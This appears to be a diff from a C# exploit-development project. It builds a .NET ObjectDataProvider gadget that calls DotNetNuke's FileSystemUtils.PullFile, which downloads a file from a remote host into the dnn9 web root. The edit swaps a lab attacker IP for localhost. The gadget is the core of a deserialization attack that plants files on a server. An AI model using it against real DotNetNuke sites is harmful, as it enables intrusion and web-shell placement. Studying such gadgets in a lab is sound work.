@@ -16,10 +16,10 @@ namespace ODPSerializer
             ObjectDataProvider myODP = new ObjectDataProvider();
             myODP.ObjectInstance = new FileSystemUtils();
             myODP.MethodName = "PullFile";
-            myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
+            myODP.MethodParameters.Add("http://localhost:8000/test.txt");
 
-            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/PullFileTest.txt");
-            Console.WriteLine("Done!"); 
+            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/test.txt");
+            Console.WriteLine("Done!");
         } 
     } 
 } 
